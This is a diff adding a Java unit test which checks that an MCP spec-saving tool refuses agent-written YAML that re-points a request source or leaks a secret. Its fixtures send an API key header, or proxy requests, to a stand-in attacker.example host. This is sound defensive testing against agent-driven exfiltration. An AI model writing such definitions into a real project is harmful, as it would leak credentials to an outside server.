@@ -238,6 +238,70 @@ class McpAuthoringSyncTest {
     assertThat(Files.exists(specs.getParent().resolve("escape.yaml"))).isFalse();
   }
 
+  /**
+   * NM3: an agent saves what a screen is made of, never what decides a request — so in dev mode it
+   * cannot re-point a proxied source at its own server and have Mateu send it the secret.
+   */
+  @Test
+  void saveSpecRefusesWhatCouldRepointARequestOrLeakASecret(@TempDir Path specs) throws Exception {
+    DevMode.enable(specs.toString());
+    String[][] refusedDefinitions = {
+      {"pay.yaml", "type: Sources\nsources:\n  - name: pay\n    source:\n      url: https://x\n"},
+      {"prod.yaml", "type: Environment\nsources:\n  pay:\n    url: https://attacker.example\n"},
+      {"r.yaml", "type: Routes\nroutes:\n  - route: x\n    layout: x.yaml\n"},
+      {
+        "p1.yaml",
+        "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    headers:\n      X-Api-Key: ${secret.API_KEY}\n"
+      },
+      {
+        "p2.yaml",
+        "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    proxy: true\n"
+      },
+      {
+        "p3.yaml",
+        "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n    url: https://attacker.example\n"
+      },
+    };
+    for (var definition : refusedDefinitions) {
+      var answer =
+          payload(
+              call(
+                  "mateu_save_spec",
+                  OM.createObjectNode().put("path", definition[0]).put("yaml", definition[1])));
+      assertThat(answer.get("saved").asBoolean()).as(definition[1]).isFalse();
+      assertThat(answer.get("reason").asText())
+          .as(definition[1])
+          .matches(
+              "(Only a page, a partial or a business-component catalogue can be saved.*|"
+                  + "A definition saved by an agent may not reference a secret.*)");
+      assertThat(Files.exists(specs.resolve(definition[0]))).as(definition[0]).isFalse();
+    }
+    // a catalogue file name is refused whatever it holds
+    for (var path : new String[] {"sources.yaml", "x/routes.yml", "environments/prod.yaml"}) {
+      var refused =
+          call(
+              "mateu_save_spec",
+              OM.createObjectNode().put("path", path).put("yaml", "type: Text\ntext: a\n"));
+      assertThat(refused.get("isError").asBoolean()).as(path).isTrue();
+      assertThat(refused.get("content").get(0).get("text").asText())
+          .startsWith("Error: Refused path");
+      assertThat(Files.exists(specs.resolve(path))).isFalse();
+    }
+    // a page naming a catalogue source by ref, mapping its own response, is fine
+    var saved =
+        payload(
+            call(
+                "mateu_save_spec",
+                OM.createObjectNode()
+                    .put("path", "ok.yaml")
+                    .put(
+                        "yaml",
+                        "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n"
+                            + "    ref: payments\n")));
+    assertThat(saved.get("reason") == null ? "" : saved.get("reason").asText())
+        .doesNotContain("agent");
+  }
+
   @Test
   void aSymlinkOutOfTheSpecsDirectoryIsRefused(@TempDir Path root) throws Exception {
     var specs = Files.createDirectories(root.resolve("specs"));
